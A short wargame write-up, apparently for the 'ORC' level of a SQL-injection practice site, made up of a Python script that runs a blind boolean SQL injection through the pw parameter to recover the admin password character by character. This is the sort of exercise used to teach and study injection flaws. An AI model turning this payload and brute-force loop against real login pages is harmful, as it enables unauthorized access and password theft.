## ORC

### Exploit Code
``` python
import requests

url = "http://los.rubiya.kr/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"
session = {'PHPSESSID':'My PHPSESSID'}
data = {}

flag=""

print("[∞] flag : ",end='')

for i in range(1,9):
   for j in range(32,127):
      data['pw']="' or id='admin' and ord(mid(pw,"+str(i)+",1))='"+str(j)+"'#"
      res = requests.get(url, params=data, cookies=session)
      if "Hello admin" in res.text:
         print(chr(j),end='')
         flag = flag + chr(j)
         break

data['pw']=flag
res = requests.get(url, params=data, cookies=session)

if "Clear!" in res.text:
   print("\n[♪] ORC Clear!")
```